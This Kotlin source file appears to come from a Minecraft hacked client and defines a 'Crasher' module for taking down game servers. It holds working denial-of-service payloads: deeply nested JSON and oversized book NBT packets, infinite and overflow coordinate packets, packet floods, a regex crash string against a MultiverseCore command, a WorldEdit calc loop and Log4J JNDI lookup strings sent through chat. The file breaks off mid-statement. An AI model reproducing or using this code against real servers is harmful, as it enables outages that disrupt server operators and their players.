
package net.ccbluex.liquidbounce.features.module.modules.other

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.event.*
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.utils.PacketUtils
import net.ccbluex.liquidbounce.utils.misc.RandomUtils
import net.ccbluex.liquidbounce.utils.timer.MSTimer
import net.ccbluex.liquidbounce.features.value.BoolValue
import net.ccbluex.liquidbounce.features.value.IntegerValue
import net.ccbluex.liquidbounce.features.value.ListValue
import net.minecraft.init.Items
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTBase
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.*
import net.minecraft.network.play.server.S2DPacketOpenWindow
import net.minecraft.network.play.server.S2EPacketCloseWindow
import net.minecraft.network.play.server.S2FPacketSetSlot
import net.minecraft.util.BlockPos
import java.util.*

@ModuleInfo(name = "Crasher", spacedName = "Crasher", category = ModuleCategory.OTHER)
class ServerCrasher : Module() {

    private val modeValue = ListValue("Mode", arrayOf(
        "Book",
        "Swing",
        "MassiveChunkLoading",
        "WorldEdit", "MultiverseCore",// "BukkitBD",
        "Pex",
        "CubeCraft",
        "AACNew", "AACOther", "AACOld",
        "MemetrixOld", "OldLoyisaNCP",
        "ItemSwitch", "ItemDrop",
        "MathOverFlow",
        "C08", "NullC08",
        "CommandComplete",
        "AACv5",
        "Log4J",
        "Inventory",
        "Rotation",
    ), "Book")
    private val packetAmountValue = IntegerValue("PacketAmount", 500, 1, 3000)
    private val bookTypeValue = ListValue("BookType", arrayOf("Plain", "Json", "Netty", "Random"), "Plain").displayable { modeValue.equals("Book") } as ListValue
    private val bookModeValue = ListValue("BookMode", arrayOf("Payload", "ItemUse", "BlockClick", "CreativeWindowClick", "Lpx", "WindowClick", "WindowPickUp"), "Payload").displayable { modeValue.equals("Book") }
    private val bookOnlyOnceValue = BoolValue("BookOnlyOnce", false).displayable { modeValue.equals("Book") }
    private val log4jModeValue = ListValue("Log4JMode", arrayOf("RawChat", "Chat", "Command"), "Chat").displayable { modeValue.equals("Log4J") }
    private val slientInventoryValue = BoolValue("SlientInventory", false).displayable { modeValue.equals("Inventory") }
    private val pexTimer = MSTimer()
    private var nowInv = -1
    private val invSlots = mutableMapOf<Int, ItemStack>()

    private val BOOK_SIZE = "................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................."
    private val BOOK_JSON = "{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"

    private fun getBook(type: String = bookTypeValue.get().lowercase()): ItemStack {
        return when (type) {
            "plain" -> {
                val bookStack = ItemStack(Items.writable_book)
                val bookCompound = NBTTagCompound()

                bookCompound.setString("author", RandomUtils.randomNumber(20))
                bookCompound.setString("title", RandomUtils.randomNumber(20))

                val pageList = NBTTagList()
                val pageText = RandomUtils.randomNumber(600)

                for (i in 0..49) {
                    pageList.appendTag(NBTTagString(pageText))
                }

                bookCompound.setTag("pages", pageList)
                bookStack.tagCompound = bookCompound

                bookStack
            }
            "netty" -> {
                val book3 = ItemStack(Items.writable_book)
                val author = "Netty$BOOK_SIZE"

                val tag3 = NBTTagCompound()
                val list3 = NBTTagList()
                for (i3 in 0..339) {
                    val tString = NBTTagString(BOOK_SIZE)
                    list3.appendTag(tString)
                }
                tag3.setString("author", author)
                tag3.setString("title", BOOK_SIZE)
                tag3.setTag("pages", list3)
                if (book3.tagCompound != null) {
                    val tagb = book3.tagCompound
                    tagb?.setTag("pages", list3)
                } else {
                    book3.setTagInfo("pages", list3)
                }

                book3
            }
            "json" -> {
                val tag = NBTTagCompound()
                val list = NBTTagList()
                for (i2 in 0..1) {
                    list.appendTag(NBTTagString(BOOK_JSON) as NBTBase)
                }
                tag.setString("author", RandomUtils.randomString(5))
                tag.setString("title", RandomUtils.randomString(5))
                tag.setByte("resolved", 1.toByte())
                tag.setTag("pages", list as NBTBase)
                val book = ItemStack(Items.writable_book)
                book.tagCompound = tag

                book
            }
            "random" -> getBook(bookTypeValue.values[RandomUtils.nextInt(0, bookTypeValue.values.size)])
            else -> throw IllegalArgumentException("Invalid book type: ${bookTypeValue.get()}")
        }
    }

    override fun onEnable() {
        mc.thePlayer ?: return

        when (modeValue.get().lowercase()) {
            "inventory" -> {
                nowInv = -1
                invSlots.clear()
                chat("Open an inventory to start.")
            }

            "crashclient" -> {
                chat("Do crash Client.")
                mc.thePlayer = null
                val s: String? = null
                println(s!!.toCharArray())
                val b = 0
                val a = 1 / b
                val aa = IntArray(1)
                aa[15] = 0
                mc.shutdown()
            }

            "log4j" -> {
                val str = "\${jndi:ldap://192.168.${RandomUtils.nextInt(1,253)}.${RandomUtils.nextInt(1,253)}}"
                mc.netHandler.addToSendQueue(C01PacketChatMessage(when(log4jModeValue.get().lowercase()) {
                    "chat" -> "${RandomUtils.randomString(5)}$str${RandomUtils.randomString(5)}"
                    "command" -> "/tell ${RandomUtils.randomString(10)} $str"
                    else -> str
                }))
            }

            "aacnew" -> {
                // Spam positions
                var index = 0
                while (index < 9999) {
                    PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + 9412 * index, mc.thePlayer.entityBoundingBox.minY + 9412 * index, mc.thePlayer.posZ + 9412 * index, true))
                    ++index
                }
            }
            "chunkloadexploit" -> {
                var index = 0
                while (index < 9999) {
                    PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX,mc.thePlayer.posY,mc.thePlayer.posZ,
                        (0x6DDF0D05L and 0x7DEE0D47L).toInt() xor ((-1651917850).toLong() xor (-263735582).toLong()) as Int != 0
                    ))
                    ++index
                }
            }


            "mathoverflow" -> {
                PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(1.7976931348623157E+308, 1.7976931348623157E+308, 1.7976931348623157E+308, true))
            }

            "aacother" -> {
                // Spam positions
                var index = 0
                while (index < 9999) {
                    PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + 500000 * index, mc.thePlayer.entityBoundingBox.minY + 500000 * index, mc.thePlayer.posZ + 500000 * index, true))
                    ++index
                }
            }

            "aacold" -> {
                // Send negative infinity position
                PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true))
            }

            "worldedit" -> {
                // Send crash command + trash check bypass (maybe)
                mc.thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}")
            }

            "multiversecore" -> {
                // Send crash command
                mc.thePlayer.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^")
            }
            
            
            
            "bukkitbd" -> {
                //mc.thePlayer.sendChatMessage("/bukkit:help\//\/"+"$"+"a&m0xDEBukkit:"+"/"+"\\"+"Queue*"+"$"+"a&m0xENRunCommand"+"$"+"a&m0xDE/shutdown"+"$"+"a&m"+"$"+"0x0Unpoll")
            }

            "cubecraft" -> {
                // Not really needed but doesn't matter
                mc.thePlayer.setPosition(mc.thePlayer.posX, mc.thePlayer.posY + 0.3, mc.thePlayer.posZ)
            }

            "massivechunkloading" -> {
                // Fly up into sky
                var yPos = mc.thePlayer.posY
                while (yPos < 255) {
                    PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, yPos, mc.thePlayer.posZ, true))
                    yPos += 5.0
                }

                // Fly over world
                var i = 0
                while (i < 1337 * 5) {
                    PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + i, 255.0, mc.thePlayer.posZ + i, true))
                    i += 5
                }
            }
        }
    }

    @EventTarget
    fun onUpdate(event: UpdateEvent) {
        when (modeValue.get().lowercase()) {
            
            "Rotation" -> {
                PacketUtils.sendPacketNoEvent(C03PacketPlayer.C05PacketPlayerLook(9.223372E18F, 9.223372E18F, true));
            }
            
            "inventory" -> {
                if(nowInv != -1 && invSlots.isNotEmpty()) {
                    var count = 0
                    while (true) {
                        invSlots.forEach { (slot, item) ->
                            // click on window
                            mc.netHandler.addToSendQueue(C0EPacketClickWindow(nowInv, slot, 0, 0, item, if(slientInventoryValue.get()) {
                                RandomUtils.nextInt(0, Short.MAX_VALUE.toInt()).toShort()
                            } else {
                                mc.thePlayer.openContainer.getNextTransactionID(mc.thePlayer.inventory)
                            }))
                            count++
                            if(count >= packetAmountValue.get()) {
                                return
                            }
                        }
                    }
                }
            }

            "book" -> {
                val bookStack = getBook()

                repeat(packetAmountValue.get()) {
                    when(bookModeValue.get().lowercase()) {
                        "payload" -> {
                            val packetBuffer = PacketBuffer(Unpooled.buffer())
                            packetBuffer.writeItemStackToBuffer(bookStack)
                            PacketUtils.sendPacketNoEvent(C17PacketCustomPayload(if (Random().nextBoolean()) "MC|BSign" else "MC|BEdit", packetBuffer))
                        }
                        "itemuse" -> {
                            PacketUtils.sendPacketNoEvent(C08PacketPlayerBlockPlacement(bookStack))
                        }
                        "blockclick" -> {
                            PacketUtils.sendPacketNoEvent(C08PacketPlayerBlockPlacement(BlockPos(RandomUtils.nextInt(-100000, 100000), RandomUtils.nextInt(-100000, 100000), RandomUtils.nextInt(-100000, 100000)), 1, bookStack, 0.0f, 0.0f, 0.0f))
                        }
                        "lpx" -> {
                            PacketUtils.sendPacketNoEvent(C08PacketPlayerBlockPlacement(BlockPos(RandomUtils.nextInt(-100000, 100000), RandomUtils.nextInt(-100000, 100000), RandomUtils.nextInt(-100000, 100000)), 1, bookStack, 0.0f, 0.0f, 0.0f))
                            val packetBuffer = PacketBuffer(Unpooled.buffer())
                            packetBuffer.writeItemStackToBuffer(bookStack)
                            PacketUtils.sendPacketNoEvent(C17PacketCustomPayload("MC|BEdit", packetBuffer))
                        }
                        "creativewindowclick" -> {
                            PacketUtils.sendPacketNoEvent(C10PacketCreativeInventoryAction(RandomUtils.nextInt(1, 30), bookStack))
                        }
                        "windowclick" -> {
                            PacketUtils.sendPacketNoEvent(C0EPacketClickWindow(0, RandomUtils.nextInt(1, 30), 0, 0, bookStack, RandomUtils.nextInt(0, 32767).toShort()))
                        }
                        "windowpickup" -> {
                            PacketUtils.sendPacketNoEvent(C0EPacketClickWindow(0, -999, 0, 5, bookStack, RandomUtils.nextInt(0, 32767).toShort()))
                        }
                    }
                }
                if(bookOnlyOnceValue.get()) {
                    state = false
                }
            }

            "cubecraft" -> {
                val x = mc.thePlayer.posX
                val y = mc.thePlayer.posY
                val z = mc.thePlayer.posZ
                repeat(packetAmountValue.get()) {
                    PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(x, y + 0.09999999999999, z, false))
                    PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true))
                }
                mc.thePlayer.motionY = 0.0
            }

            "pex" -> if (pexTimer.hasTimePassed(2000)) {
                // Send crash command
                mc.thePlayer.sendChatMessage(if (Random().nextBoolean()) "/pex promote a a" else "/pex demote a a")
                pexTimer.reset()
            }

            "swing" -> {
                repeat(packetAmountValue.get()) {
                    PacketUtils.sendPacketNoEvent(C0APacketAnimation())
                }
            }

            "memetrixold" -> {
                if (mc.thePlayer.ticksExisted % 2 == 0) {
                    PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(RandomUtils.nextDouble(-32768.0, 32768.0), RandomUtils.nextDouble(-32768.0, 32768.0), RandomUtils.nextDouble(-32768.0, 32768.0), true))
                }
            }

            "oldloyisancp" -> {
                mc.timer.timerSpeed = 0.45f
                PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(RandomUtils.nextDouble(-1048576.0, 1048576.0), RandomUtils.nextDouble(-1048576.0, 1048576.0), RandomUtils.nextDouble(-1048576.0, 1048576.0), true))
                PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(RandomUtils.nextDouble(-65536.0, 65536.0), RandomUtils.nextDouble(-65536.0, 65536.0), RandomUtils.nextDouble(-65536.0, 65536.0), true))
            }

            "itemswitch" -> {
                repeat(packetAmountValue.get()) {
                    PacketUtils.sendPacketNoEvent(C09PacketHeldItemChange(RandomUtils.nextInt(0, 8)))
                }
            }

            "itemdrop" -> {
                mc.netHandler.addToSendQueue(C16PacketClientStatus(C16PacketClientStatus.EnumState.OPEN_INVENTORY_ACHIEVEMENT))
